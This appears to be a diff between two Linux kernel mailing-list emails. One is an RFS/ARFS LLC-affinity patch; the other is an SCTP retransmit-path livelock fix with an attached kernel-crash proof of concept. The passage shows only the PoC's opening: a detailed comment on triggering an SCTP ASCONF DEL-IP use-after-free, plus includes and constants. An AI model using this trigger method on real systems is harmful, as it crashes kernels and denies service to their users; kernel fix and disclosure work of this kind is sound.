@@ -1,348 +1,687 @@
-Received: from mail-pg1-f177.google.com (mail-pg1-f177.google.com [209.85.215.177])
+Received: from mail-pj1-f47.google.com (mail-pj1-f47.google.com [209.85.216.47])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EA91727473
-	for <netdev@vger.kernel.org>; Wed,  2 Sep 2026 02:52:17 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.177
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9A29330F52B
+	for <netdev@vger.kernel.org>; Wed,  2 Sep 2026 02:53:05 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.47
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788317539; cv=none; b=XUE8aXO8QTRBrPm6iYZTtj+HFdnGR9+ObIR5Yo1JlbvPVNURmaWQqdg02c3G9kqErpbIRrKeGN5LPbFPOgol2oiejjQsCT0JPLA3C6y0i6ObYR7DcsDbKQNA1K//o233Sv6REv9oy8h+7vWYgZXdqTSSRmaxS7U9/4oPBcrLVjY=
+	t=1788317588; cv=none; b=e1uk7f499C9I1noyGHNMv2IZPcsEwGCd+LBkfhxvbvCjv8Iva8dwG+Lww40e0i1UO8xY9b2dwSjDGU3VaxM0tFKxHAcXXd37LHO1YaRxxdWb+R1mspBaR/preLhvNjhRuQl3p8007666z3Ij3xaDkJQOlZuzLPGY5AiMosnyHyM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788317539; c=relaxed/simple;
-	bh=YeV15R2lDRiVzc/laEc1ZaaizGWz3jJF/D0Qx6RqRec=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=PI5+HDKNeVX+DZn3aF3Klub4TShvyAF7cactXFYmHgshdcdYwoOL6TlEVbBGCaJ+CuiEYocMhn9P/wRlz9rmdmvIL+ZBjNPb1IdT4MRPkWY9ewUeALvCoi/wQvP+xH1gNWcoUPee0ySWq0aZv3/McwdZATcSq0IK6fgw/Aa06yk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=r/7I0AbV; arc=none smtp.client-ip=209.85.215.177
+	s=arc-20240116; t=1788317588; c=relaxed/simple;
+	bh=dpuCgbdp399BvtRbYBxctf0r6zfxTLSACjrQYL0yWds=;
+	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
+	 MIME-Version:Content-Type:Content-Disposition; b=eJqnsSnf9je9NpFmCxSES7UL/ChLCTtsyCd04K0bhLkiNJExVlr0yr72/bCJfSMREZj8AyXsxH2cqQ8+LVR+/Ck174hpH5+8PLV5nfYLIllAqz9Tp7t16KUO21YkNw5YOCmP2bE5qUxE46+x7Ue8ZJq6s9WB0J7C4jDsgpxoM4w=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=bkhzQca9; arc=none smtp.client-ip=209.85.216.47
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="r/7I0AbV"
-Received: by mail-pg1-f177.google.com with SMTP id 41be03b00d2f7-cc147d86bebso719514a12.0
-        for <netdev@vger.kernel.org>; Tue, 01 Sep 2026 19:52:17 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="bkhzQca9"
+Received: by mail-pj1-f47.google.com with SMTP id 98e67ed59e1d1-38f57e312ecso91825a91.1
+        for <netdev@vger.kernel.org>; Tue, 01 Sep 2026 19:53:05 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1788317537; x=1788922337; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=yzTJ93PCaEZ5D5jmlYA5kUGeF6TKHbLfz1jwc+xMCyE=;
-        b=r/7I0AbVBo3d8GKzPF22GrmiLD4h7cwcx2qnft4p/akNjwJoLEDFz5BGIAAOsWMbDG
-         m7cPx3LfbCdzovd2UXIxVqXfGRtnZIe8vf3FFrrrcsIZm84FhGrkGo57nRKwM4v9K0xS
-         JoP2pAY7PIf1y291nzCg1nS1tkRFgTU0j6djqCYkkuAOnf4S/b6/RQkPfnKd93SH8sIB
-         NlTzoyzOwpPpzAs56kGsTm7AoyVgyLcSaEWuunUQwmCFz5RfpLr0ffCIFhy8gLyl3C5K
-         3e7ceYvkbmpZyCIDg1gZwxW+K8DM4wv94yastM6jRN/MjAAiolP1GTsalaeG/71nwAJ0
-         +G+Q==
+        d=gmail.com; s=20251104; t=1788317584; x=1788922384; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-disposition:content-type
+         :mime-version:references:in-reply-to:message-id:subject:cc:to:from
+         :date:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=2GqCSOLlVLGsId6mtHAUwhg+HGCjbvnLLyhmiVIgBUE=;
+        b=bkhzQca9zOWpQuSgtfKx9Hzz25nhwmYY47dYYOxPEIjkulk/OxztlReCSUOw6jEyav
+         HaITBV8kpzPp83xwKvTdfDMwXBz1hF32gIpYE4/fYbksz2aBWqNAiALphKoAltISOauU
+         XNQcdxUFmVehacjyBmUlA8c4lLyHgmFxAPFMVCNKtVPP7IBuRGFpEbbZuxJM7TGL8KTS
+         ZdtI5S3QqgyGZQdUYfQv7lPPqXIcxbzMS9Rb2sZQwY0/4k27BHs4Ezcnch7bRLlK+AGG
+         1/9PVKxVUMl8mt6X6D9TFx/XHja5uvCgb6yUfsbiYRIQrRcPOqHu5yhPY4ew+nqqcHk4
+         f2gw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1788317537; x=1788922337;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=yzTJ93PCaEZ5D5jmlYA5kUGeF6TKHbLfz1jwc+xMCyE=;
-        b=CHTl4frSFpXiPPEXcdY2mOL7bhq5XCWYQDE8YqJkFPLZPh2hg8MIVa9orL2rgo1K0S
-         JTbJL9bcqrtFhSeMDmDswoueNHJjPsvG/RIPMIW4/RRhjekY134761kF0woSaUPmbIqd
-         5naahihpNrUxeUxN3dmws9E6rEoNecokZVdH8ajoOxJQ2hY7kgR0pZKzuytgyIMAh+rx
-         NVFXvEZWJqZWly/Ih79lz3n/kWt1zmSX2rGE54LHyc7NjE22dczbVJwUmVrUKVEE09Xm
-         ow+oOrDnVhw8S2AuOAROavwWWDc7xVsj90jU4FVTuSU3OQZo9PzcyY4I2AHXb+rfKQ4Q
-         HOhw==
-X-Forwarded-Encrypted: i=1; AKwUvBzqirBFgxUWDxBtZj2eJsV6wdRnfuk/hnpnKYNpIiGFJg/lwaekonx11TS2zAgNGfh7RwqEU1s=@vger.kernel.org
-X-Gm-Message-State: AFuF++kb0y2WSIG+fHHz10fEZuNfm4bUMKYcZ7vY+kcoPn705xDEVM/z
-	TgE1Hfy7b5l+8P8vTw5jHp8/WZSEWOK7XKDk5WLV3IL0wdLkqbW4FNjG
-X-Gm-Gg: AYBFou02VQakV8eSNejEugZuq+RNTa31b+3zvp5kRR3nrm7YD/KBudxa1/cjeOSD9X1
-	6f7L6jOSwts2RLno3ZLrAbRSDmqUwgWV4oMvuuhjg9otV3kEh+FcMjO9shPE80K4c7wil0Suic4
-	s/JGLr96Ct/vYaRl8OL0BWirBRjHlJDNOtG9Io5z9UleRu/hgpeZgmDWJJZzOzmhQdijhAlx22i
-	Ufopa15mhQKD45u/Rma5sEeofvGrM8qN2yYGKF+OxKWtf1XhDgjL4FZAr5yMQ3tNYOjaCrBMOgX
-	7STT14P0TdUGS8DoZgIp4raMAU7zHIqJ+DBU+xfxbHw/aYm133K/a1TAoxD4jZMRKvsdKxiR5WT
-	fUHK0YRtVvWL2rA94Fe1O9PF0gUDOAVjLP9f1XC4qxHTLCVaOC4EdCWhI9xs5AWQU1momk8Fv7f
-	pxN1vISYSzGEc61WQ0mT1mE6oNklcl67HHqeDp8sp/5Y/8mVZ4ZdPZRpfITwpcStDmiVc9CSp9q
-	lWfOGqOBKyZf9nnWkDt6GGkSIsb7mNdNZFpJaYz
-X-Received: by 2002:a17:90b:52cf:b0:384:927f:3db9 with SMTP id 98e67ed59e1d1-39af57d22cemr27654a91.1.1788317537183;
-        Tue, 01 Sep 2026 19:52:17 -0700 (PDT)
-Received: from localhost.localdomain ([2409:891f:1d85:2435:e053:31e9:f73:7a2a])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39ae60a8e61sm531263a91.0.2026.09.01.19.52.11
-        (version=TLS1_3 cipher=TLS_CHACHA20_POLY1305_SHA256 bits=256/256);
-        Tue, 01 Sep 2026 19:52:16 -0700 (PDT)
-From: Chuang Wang <nashuiliang@gmail.com>
-To: 
-Cc: Chuang Wang <nashuiliang@gmail.com>,
-	"David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>,
-	Kuniyuki Iwashima <kuniyu@google.com>,
-	Willem de Bruijn <willemb@google.com>,
-	Stanislav Fomichev <sdf.kernel@gmail.com>,
-	Hangbin Liu <liuhangbin@gmail.com>,
-	Samiullah Khawaja <skhawaja@google.com>,
-	Neal Cardwell <ncardwell@google.com>,
-	Martin KaFai Lau <martin.lau@kernel.org>,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org
-Subject: [PATCH net-next v8] net: reduce RFS/ARFS flow updates by checking LLC affinity
-Date: Wed,  2 Sep 2026 10:51:50 +0800
-Message-ID: <20260902025203.4741-1-nashuiliang@gmail.com>
-X-Mailer: git-send-email 2.50.1
+        d=1e100.net; s=20251104; t=1788317584; x=1788922384;
+        h=content-transfer-encoding:content-disposition:content-type
+         :mime-version:references:in-reply-to:message-id:subject:cc:to:from
+         :date:x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to:content-type;
+        bh=2GqCSOLlVLGsId6mtHAUwhg+HGCjbvnLLyhmiVIgBUE=;
+        b=HfeG5yqcE5dba+O3KDdG3AZJLwAMHPfbuVNPAyFeUOj7f4hUBqWqeQOcdundd3XOfi
+         Oxesi5ijXhzF4i72kiDr+/GGZEErXRVSTDN3QHgf+0CmkC67NP1Pf5GNCB+70nxFssv9
+         5TN5NV6VKp6KXIcOyJDlSpcSBYl62D2moTq5RKHCqq65C2w0eTYACgPVVhtTFIGFppkV
+         GE7ct8B0fl2CBMT4s30v7BReZINJFEoGb97AX9SsvK6gdH83FKGFozzHv3whBhNbh4GP
+         PFGeymdPtKLr1e/5/C1yTz0ehrdRBmLBPfNkTX0qj8RTSwce8U++gAdV9scbROT2ga9c
+         DK3g==
+X-Forwarded-Encrypted: i=1; AKwUvByqWXrPUhTcL1QyXvVn/FQQ47wDkyISL58ezpe21EHxhDTyNlOLaNbW75ztavygSJVpu/dv170=@vger.kernel.org
+X-Gm-Message-State: AFuF++llIPWQgJzRCVC4Ppn5TE+6rLAavYaCD7/NTZJkhBTELncH8Opp
+	uqorRZsxTRxVTeY5n0NTpiuzneRSuXfQ+jaXkukfRRE0KBwNrGPBD++w
+X-Gm-Gg: AYBFou3VKo3bvAHPkO7c41xxi6uFBnEMBXWQeEOe5I/ajOVmCz2hunK9St8t2aLK+94
+	93tyWq5teoY/Agh8jjF0gJetC3iXNF0kE8SD8Q11YDIr445KWGwpz0crHTXNe1/sOSibbtvS33D
+	8rKFPRo31RO0UnguSG74brjPbhrfWityD09imK2///5cU7kFZXeV+epfBjNrIEfL7ipk4pMywTf
+	KZj/oMyaZDqYTQQV8qIFwj8EimCf5cq9sEgZjzBnA11XhDBpn3W2MrnQape+HcqwNCYoyavDnf1
+	cPNN8rcAiWSRrQHfOTV828bORkrXqKoch5tbHmS4W2Fx/g00Egi42VSoejlLPFSVYHZ309QqpNs
+	aK0NccLEp3+xWw9jamYAR0D5tUk6S6d8SICOMlj01ARMHSoXxnpTDPEC5uLvTxEfrbMo3q4ARWt
+	yTAJrFA+/r5tqnTG+16dsXm8W1/2JGQ/ZF23ywDE9d/8CpcFNLahZe+t28CXWHWprXrA8FRPhMs
+	CiCjdHQziAeTM/ztAGw09oVbhtr/WfgQQhy
+X-Received: by 2002:a17:90b:3841:b0:398:bac0:238e with SMTP id 98e67ed59e1d1-39aee24957amr1355015a91.6.1788317583823;
+        Tue, 01 Sep 2026 19:53:03 -0700 (PDT)
+Received: from sunyiqi-llm-kernel ([189.1.242.96])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3990d7bb7c5sm10243449a91.14.2026.09.01.19.53.00
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 01 Sep 2026 19:53:03 -0700 (PDT)
+Date: Wed, 2 Sep 2026 10:52:06 +0800
+From: Yiqi Sun <sunyiqixm@gmail.com>
+To: lucien.xin@gmail.com
+Cc: davem@davemloft.net, edumazet@google.com, horms@kernel.org,
+	kuba@kernel.org, linux-kernel@vger.kernel.org,
+	linux-sctp@vger.kernel.org, marcelo.leitner@gmail.com,
+	netdev@vger.kernel.org, pabeni@redhat.com, stable@vger.kernel.org,
+	sunyiqixm@gmail.com
+Subject: [PATCH v2 net] sctp: avoid livelock while updating retransmit path
+Message-ID: <20260902025206.phbpyxmpf4zrtdpx@sunyiqi-llm-kernel>
+In-Reply-To: <CADvbK_dFoagLs1c4b-3aFqsbDueu3VO0t-8S93+6GgevuoRBLQ@mail.gmail.com>
+References: <CADvbK_dFoagLs1c4b-3aFqsbDueu3VO0t-8S93+6GgevuoRBLQ@mail.gmail.com>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="jv3lfyjkrnvkybth"
+Content-Disposition: inline
 Content-Transfer-Encoding: 8bit
 
-The current implementation of rps_record_sock_flow() updates the flow
-table every time a socket is processed on a different CPU. In high-load
-scenarios, especially with Accelerated RFS (ARFS), this triggers
-frequent flow steering updates via ndo_rx_flow_steer.
 
-For drivers like mlx5 that implement hardware flow steering, these
-constant updates lead to significant contention on internal driver locks
-(e.g., arfs_lock). This contention often becomes a performance
-bottleneck that outweighs the steering benefits.
+--jv3lfyjkrnvkybth
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-This patch introduces a cache-aware update strategy: the flow record is
-only updated if the flow migrates across Last Level Cache (LLC)
-boundaries. This minimizes expensive hardware reconfigurations while
-preserving cache locality for the application. A new sysctl,
-net.core.rps_feat_llc_affinity, is added to toggle this feature.
+On Thu, Aug 27, 2026 at 3:50 AM, Xin Long wrote:
+> After removing the continue, I think you can keep using
+> if (trans == asoc->peer.retran_path) here without 'last' needed.
 
-Additionally, export sock_rps_record_flow_hash() and
-sock_rps_record_flow(). This resolves a symbol visibility compilation
-error triggered by 'tun' using sock_rps_record_flow_hash() in
-tun_flow_update() when CONFIG_TUN is built as a module. The same logic
-is applied to SCTP, allowing it to use sock_rps_record_flow() safely
-when built as a module.
+Yes. The v1 'last' variable was redundant once the SCTP_UNCONFIRMED
+path no longer uses continue. Drop it in this revision and retain the
+original wraparound comparison after the candidate-selection block.
 
-Performance Test Results:
-The patch was tested in a K8s environment (AMD CPU 128*2, 16-core Pod
-with CPU pinning, mlx5 NIC) using brpc[1] echo_server and rpc_press.
+The reproducer is attached.
 
-rpc_press Commands:
+sctp_assoc_update_retran_path() walks the association transport list
+from the current retransmit path's successor and stops once it reaches
+the current retransmit path again. However, the loop skips transports in
+SCTP_UNCONFIRMED state before checking for the wraparound condition.
 
-  for i in {1..8}; do
-    ./rpc_press -proto=./echo.proto -method=example.EchoService.Echo
-    -server=<IP>:8000 -input='{"message":"hello"}'
-    -qps=0 -thread_num=512 -connection_type=pooled &
-  done
+This makes the loop non-terminating when the association contains only
+UNCONFIRMED transports at that point and asoc->peer.retran_path is also
+UNCONFIRMED. One way to reach that state is through ASCONF wildcard
+DEL-IP processing after an unconfirmed address is selected as the
+primary transport. sctp_assoc_del_nonprimary_peers() then removes the
+other transports one by one; when removing the current retran_path,
+sctp_assoc_rm_peer() calls sctp_assoc_update_retran_path() before
+unlinking it. If the remaining candidate and the current retran_path are
+both UNCONFIRMED, the loop repeatedly continues before it can observe
+that it has completed a full pass.
 
-Monitor mlx5e_rx_flow_steer frequency:
+Fix this by considering a transport only when it is not UNCONFIRMED,
+then checking whether the walk has returned to retran_path. This makes
+the full-pass termination independent of the transport state while
+preserving the existing fallback selection semantics.
 
-  /usr/share/bcc/tools/funccount -i 1 mlx5e_rx_flow_steer
+Also restore the NULL guard around the retran_path assignment. In the
+all-UNCONFIRMED case there is no eligible replacement transport, and
+installing NULL would leave later retransmit-path users and the debug
+print with a NULL path.
 
-Frequency of mlx5e_rx_flow_steer (via funccount[2]):
-
-  Before: ~335,000 counts/sec
-  After:   ~23,000 counts/sec (reduced by ~93%)
-
-System Metrics (after enabling rps_feat_llc_affinity):
-
-  CPU Utilization: 38% -> 32%
-  CPU PSI (Pressure Stall Information): 20% -> 10%
-
-These results demonstrate that filtering updates by LLC affinity
-significantly reduces driver lock contention and improves overall
-CPU efficiency under heavy network load.
-
-[1] https://github.com/apache/brpc/
-[2] https://github.com/iovisor/bcc/blob/master/tools/funccount.py
-
-Signed-off-by: Chuang Wang <nashuiliang@gmail.com>
+Fixes: 4c47af4d5eb2 ("net: sctp: rework multihoming retransmission path selection to rfc4960")
+Signed-off-by: Yiqi Sun <sunyiqixm@gmail.com>
 ---
-v6 -> v8:
-- simplify code and fix errors in AI submissions by Simon Horman
-v5 -> v6:
-- remove the multi-check 'old_val == new_val' by Xuan Zhuo
-- fix 'modpost: "sock_rps_record_flow_hash" [drivers/net/tun.ko] undefined!' by kernel
-  test robot
-- fix 'tcp.c:(.text+0x3e90): undefined reference to `sock_rps_record_flow'' by kernel test
-  robot
-v4 -> v5: fix 'modpost: "rps_llc_check" [net/sctp/sctp.ko] undefined!' by kernel test robot
-v3 -> v4: add rps_llc_check by Eric Dumazet
-v2 -> v3: patch net -> net-next by Jakub Kicinski
-v1 -> v2: add rps_feat_llc_affinity; add brpc tests
- include/net/rps.h          | 28 +++++-----------
- net/core/dev.c             | 66 ++++++++++++++++++++++++++++++++++++++
- net/core/sysctl_net_core.c |  8 +++++
- 3 files changed, 82 insertions(+), 20 deletions(-)
+Changes in v2:
+- Drop the redundant 'last' variable as suggested by Xin Long.
+- Link to v1: https://lore.kernel.org/r/20260827075006.3979566-1-sunyiqixm@gmail.com/
+---
+ net/sctp/associola.c | 15 ++++++++-------
+ 1 file changed, 8 insertions(+), 7 deletions(-)
 
-diff --git a/include/net/rps.h b/include/net/rps.h
-index e33c6a2fa8bb..6dacf0888a6c 100644
---- a/include/net/rps.h
-+++ b/include/net/rps.h
-@@ -12,6 +12,7 @@
+diff --git a/net/sctp/associola.c b/net/sctp/associola.c
+index c0512c827d0f..4521be3bd85a 100644
+--- a/net/sctp/associola.c
++++ b/net/sctp/associola.c
+@@ -1289,18 +1289,19 @@ void sctp_assoc_update_retran_path(struct sctp_association *asoc)
+ 		/* Manually skip the head element. */
+ 		if (&trans->transports == &asoc->peer.transport_addr_list)
+ 			continue;
+-		if (trans->state == SCTP_UNCONFIRMED)
+-			continue;
+-		trans_next = sctp_trans_elect_best(trans, trans_next);
+-		/* Active is good enough for immediate return. */
+-		if (trans_next->state == SCTP_ACTIVE)
+-			break;
++		if (trans->state != SCTP_UNCONFIRMED) {
++			trans_next = sctp_trans_elect_best(trans, trans_next);
++			/* Active is good enough for immediate return. */
++			if (trans_next->state == SCTP_ACTIVE)
++				break;
++		}
+ 		/* We've reached the end, time to update path. */
+ 		if (trans == asoc->peer.retran_path)
+ 			break;
+ 	}
  
- extern struct static_key_false rps_needed;
- extern struct static_key_false rfs_needed;
-+extern struct static_key_false rps_feat_llc_affinity;
+-	asoc->peer.retran_path = trans_next;
++	if (trans_next)
++		asoc->peer.retran_path = trans_next;
  
- /*
-  * This structure holds an RPS map which can be of variable length.  The
-@@ -55,11 +56,14 @@ struct rps_sock_flow_table {
- 
- #define RPS_NO_CPU 0xffff
- 
-+bool rps_llc_check(u32 old_val, u32 new_val);
-+
- static inline void rps_record_sock_flow(rps_tag_ptr tag_ptr, u32 hash)
- {
- 	unsigned int index = hash & rps_tag_to_mask(tag_ptr);
- 	u32 val = hash & ~net_hotdata.rps_cpu_mask;
- 	struct rps_sock_flow_table *table;
-+	u32 old_val;
- 
- 	/* We only give a hint, preemption can change CPU under us */
- 	val |= raw_smp_processor_id();
-@@ -68,7 +72,8 @@ static inline void rps_record_sock_flow(rps_tag_ptr tag_ptr, u32 hash)
- 	/* The following WRITE_ONCE() is paired with the READ_ONCE()
- 	 * here, and another one in get_rps_cpu().
- 	 */
--	if (READ_ONCE(table[index].ent) != val)
-+	old_val = READ_ONCE(table[index].ent);
-+	if (old_val != val && rps_llc_check(old_val, val))
- 		WRITE_ONCE(table[index].ent, val);
- }
- 
-@@ -136,25 +141,8 @@ static inline bool rfs_is_needed(void)
- #endif
- }
- 
--static inline void sock_rps_record_flow_hash(__u32 hash)
--{
--#ifdef CONFIG_RPS
--	if (!rfs_is_needed())
--		return;
--
--	_sock_rps_record_flow_hash(hash);
--#endif
--}
--
--static inline void sock_rps_record_flow(const struct sock *sk)
--{
--#ifdef CONFIG_RPS
--	if (!rfs_is_needed())
--		return;
--
--	_sock_rps_record_flow(sk);
--#endif
--}
-+void sock_rps_record_flow_hash(__u32 hash);
-+void sock_rps_record_flow(const struct sock *sk);
- 
- static inline void sock_rps_delete_flow(const struct sock *sk)
- {
-diff --git a/net/core/dev.c b/net/core/dev.c
-index 38336858c168..b27839eb594d 100644
---- a/net/core/dev.c
-+++ b/net/core/dev.c
-@@ -5052,6 +5052,8 @@ struct static_key_false rps_needed __read_mostly;
- EXPORT_SYMBOL(rps_needed);
- struct static_key_false rfs_needed __read_mostly;
- EXPORT_SYMBOL(rfs_needed);
-+struct static_key_false rps_feat_llc_affinity __read_mostly;
-+EXPORT_SYMBOL(rps_feat_llc_affinity);
- 
- static u32 rfs_slot(u32 hash, rps_tag_ptr tag_ptr)
- {
-@@ -5263,6 +5265,48 @@ static int get_rps_cpu(struct net_device *dev, struct sk_buff *skb,
- 	return cpu;
- }
- 
-+/**
-+ * rps_llc_check - determine if RPS flow table should be updated.
-+ * @old_val: previous flow record value.
-+ * @new_val: target flow record value.
-+ *
-+ * Return: true if the record needs an update, false otherwise.
-+ */
-+bool rps_llc_check(u32 old_val, u32 new_val)
-+{
-+	u32 old_cpu = old_val & net_hotdata.rps_cpu_mask;
-+	u32 new_cpu = new_val & net_hotdata.rps_cpu_mask;
-+
-+	/*
-+	 * RPS LLC Affinity Feature:
-+	 * Reduce RFS/ARFS flow updates by checking LLC affinity.
-+	 *
-+	 * Frequent flow table updates can trigger constant hardware steering
-+	 * reconfigurations (e.g., ndo_rx_flow_steer), leading to significant
-+	 * contention on driver internal locks (like mlx5's arfs_lock).
-+	 *
-+	 * This strategy only updates the flow record if it migrates across LLC
-+	 * boundaries. This minimizes expensive hardware updates while preserving
-+	 * cache locality for the application.
-+	 */
-+	if (static_branch_unlikely(&rps_feat_llc_affinity)) {
-+		/* Force update if the recorded CPU is invalid or has gone offline */
-+		if (old_cpu >= nr_cpu_ids || !cpu_active(old_cpu))
-+			return true;
-+
-+		/*
-+		 * If CPUs do not share a cache, allow the update to prevent
-+		 * expensive remote memory accesses and cache misses.
-+		 */
-+		if (!cpus_share_cache(old_cpu, new_cpu))
-+			return true;
-+
-+		return false;
-+	}
-+
-+	return true;
-+}
-+
- #ifdef CONFIG_RFS_ACCEL
- 
- /**
-@@ -5318,6 +5362,28 @@ static void rps_trigger_softirq(void *data)
- 
- #endif /* CONFIG_RPS */
- 
-+void sock_rps_record_flow_hash(__u32 hash)
-+{
-+#ifdef CONFIG_RPS
-+	if (!rfs_is_needed())
-+		return;
-+
-+	_sock_rps_record_flow_hash(hash);
-+#endif
-+}
-+EXPORT_SYMBOL(sock_rps_record_flow_hash);
-+
-+void sock_rps_record_flow(const struct sock *sk)
-+{
-+#ifdef CONFIG_RPS
-+	if (!rfs_is_needed())
-+		return;
-+
-+	_sock_rps_record_flow(sk);
-+#endif
-+}
-+EXPORT_SYMBOL(sock_rps_record_flow);
-+
- /* Called from hardirq (IPI) context */
- static void trigger_rx_softirq(void *data)
- {
-diff --git a/net/core/sysctl_net_core.c b/net/core/sysctl_net_core.c
-index eb35da3556f4..9b6702f5eab1 100644
---- a/net/core/sysctl_net_core.c
-+++ b/net/core/sysctl_net_core.c
-@@ -210,6 +210,7 @@ static int rps_sock_flow_sysctl(const struct ctl_table *table, int write,
- 	kvfree_rcu_mightsleep(tofree);
- 	return ret;
- }
-+
- #endif /* CONFIG_RPS */
- 
- #ifdef CONFIG_NET_FLOW_LIMIT
-@@ -554,6 +555,13 @@ static struct ctl_table net_core_table[] = {
- 		.mode		= 0644,
- 		.proc_handler	= rps_sock_flow_sysctl
- 	},
-+	{
-+		.procname	= "rps_feat_llc_affinity",
-+		.data		= &rps_feat_llc_affinity.key,
-+		.maxlen		= sizeof(rps_feat_llc_affinity.key),
-+		.mode		= 0644,
-+		.proc_handler	= proc_do_static_key
-+	},
- #endif
- #ifdef CONFIG_NET_FLOW_LIMIT
- 	{
+ 	pr_debug("%s: association:%p updated new path to addr:%pISpc\n",
+ 		 __func__, asoc, &asoc->peer.retran_path->ipaddr.sa);
 -- 
-2.47.3
+2.34.1
 
+
+--jv3lfyjkrnvkybth
+Content-Type: text/x-csrc; charset=utf-8
+Content-Disposition: attachment;
+	filename="cve-2026-64564-fix-verifier-sctp-cpu-stall-ai.c"
+Content-Transfer-Encoding: 8bit
+
+/*
+ * Crash PoC for CVE-2026-64564 — SCTP ASCONF DEL-IP Use-After-Free
+ *
+ * Vulnerability
+ * -------------
+ * sctp_process_asconf_param() (net/sctp/sm_make_chunk.c) caches the transport
+ * the ASCONF chunk is processed against in asconf->transport.  This is the
+ * peer transport matching the ASCONF's leading Address Parameter L, set during
+ * reception via __sctp_rcv_asconf_lookup() (net/sctp/input.c).
+ *
+ * The DEL-IP case rejects deleting the packet *source* address (ADDIP D8,
+ * SCTP_ERROR_DEL_SRC_IP) but, on unpatched kernels, nothing protects
+ * asconf->transport itself.  A single ASCONF can therefore carry, in order:
+ *
+ *     [Address Parameter L] [DEL-IP L] [DEL-IP 0.0.0.0]
+ *
+ * where L differs from the packet source.  The DEL-IP for L passes the D8
+ * check and calls sctp_assoc_rm_peer() on the transport that asconf->transport
+ * still points at, freeing it (RCU-deferred via call_rcu).  The following
+ * wildcard DEL-IP then reuses the now-dangling asconf->transport in
+ * sctp_assoc_set_primary() and sctp_assoc_del_nonprimary_peers():
+ *   - set_primary() dereferences the freed transport (->ipaddr, ->state, ->cacc)
+ *     and plants the dangling pointer into asoc->peer.primary_path / active_path.
+ *   - del_nonprimary_peers(), keeping only the pointer that is no longer on the
+ *     list, removes every real transport, leaving transport_count == 0 and
+ *     primary_path/active_path pointing at freed memory.
+ *
+ * The fix (sm_make_chunk.c) adds:
+ *     if (peer == asconf->transport)
+ *         return SCTP_ERROR_REQ_REFUSED;
+ * before sctp_assoc_rm_peer(), so the wildcard branch can never reuse a freed
+ * transport.
+ *
+ * This PoC triggers the UAF and then dereferences the dangling pointer to
+ * crash the kernel.
+ *
+ * Build:  gcc -o poc poc.c -static
+ *   alt:  gcc -o poc poc.c
+ * Run:    ./poc
+ *
+ * Requires CONFIG_USER_NS=y (unprivileged user namespaces).
+ * Target: Linux 6.6 kernel (before/after the fix).
+ */
+
+#define _GNU_SOURCE
+#include <poll.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdint.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <sys/syscall.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <linux/if_packet.h>
+#include <linux/if_ether.h>
+
+/* ---- network constants ---- */
+#define VPORT 20000                       /* server (victim) SCTP port */
+#define BPORT 20001                       /* client (peer) SCTP port    */
+#define LOOP  htonl(0x7f000001)           /* 127.0.0.1 — server address */
+#define SRCB  htonl(0x7f000009)           /* 127.0.0.9 — spoofed source (blackholed) */
+#define L_IP  0x7f000003                   /* 127.0.0.3 — DEL-IP target (a peer transport) */
+
+/* ---- SCTP UAPI constants (avoid header conflicts) ---- */
+#define SOL_SCTP_        132
